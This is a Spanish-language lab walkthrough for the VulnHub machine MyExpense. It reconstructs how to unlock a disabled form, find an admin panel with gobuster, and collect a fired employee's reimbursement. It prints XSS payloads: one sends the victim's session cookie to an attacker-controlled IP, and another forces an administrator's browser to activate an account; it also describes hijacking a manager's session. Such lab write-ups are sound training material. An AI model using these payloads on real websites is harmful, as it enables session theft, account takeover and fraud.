# MyExpense

- Máquina de vulnhub, para practicar XSS y SQL Injection  
- Descarga: <a href="https://www.vulnhub.com/entry/myexpense-1,405/">MyExpense</a>

### Antecedentes
Tenemos un usuario llamado Samuel, que ha sido despedido de la empresa y le deben todavía 750€ de un viaje que hizo. Para cobrarlo, debemos hacer la solicitud a través de la web pero nuestro usuario ha sido eliminado o deshabilitado. Nuestra misión es intentar loguearnos y conseguir cobrar esa cantidad.  
Your credentials were: samuel/fzghn4lw

### Accediendo a la web
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense1.jpg?raw=true">
Introducimos la url en el navegador y vamos al apartado para crear una cuenta. El botón de crear cuenta está bloqueado, así que inspeccionamos el codigo fuente y desbloqueamos el botón eliminando la línea **disabled**

<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense2.jpg?raw=true">
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense3.jpg?raw=true">

Intentamos hacer login pero nuestra cuenta está deshabilitada

<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense4.jpg?raw=true">

### Fuzzing

Hacemos fuzzing con gobuster y encontramos la carpeta admin

<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense5.jpg?raw=true">

seguimos fuzzeando y encontramos admin.php y accedemos. Vemos que aparece un panel con los datos de usuarios, y Samuel y los usuarios creados están deshabilitados. no se pueden deshabilitar. solo puede un administrador.

<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense6.jpg?raw=true">


### XSS 
En formulario de creación de usuarios se ha detectado que se puede hacer XSS, con lo que con suerte, podremos robar la cookie de sesión del Administrador.  

Ponemos a la escucha con netcat en kali:  
```
python3 -m http.server 80
```

Introducimos el siguiente codigo en el formulario, por ejemplo en el campo de apellido:
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense7.jpg?raw=true">
```
#XSS Payload
<script>img = new Image(); img.src = "http://192.168.43.57/a.php?"+document.cookie;</script>
```
Hemos recibido la cookie!
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense8.jpg?raw=true">

Pero no nos sirve porque no puede estar el administrador logueado en 2 equipos distintos a la vez. Así que hay que forzar a que el administrador utilice el botón para activar el usuario.  
Si nos fijamos al clicar el boton, es simplemente una acción que lleva a una URL, probaremos a meter esa url en el código XSS
Para ello volvemos a crear otro usuario y en el apellido, por ejemplo. Metemos el siguiente código:  

```
# XSS Payload
<script>document.write('<img src="http://192.168.56.104/admin/admin.php?id=11&status=active"/>');</script>

```
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense9.jpg?raw=true">
esperamos un poco y voilá! se activó!
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense10.jpg?raw=true">

### Enviando la solicutid de pago
Una vez en el perfil de Samuel, aceptamos el envío de la solicitud de los 750€. Parece que el manager Manon Riviere debe aprobar esto. para ello deberemos robarle la sesión.  
Parece que tienen un chat en común, así que aprovecharemos el textbox para hacer un robo de sesión con cookies.  
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense11.jpg?raw=true">
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense12.jpg?raw=true">

Una vez en el perfil, aceptamos la solicitud.
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense13.jpg?raw=true">


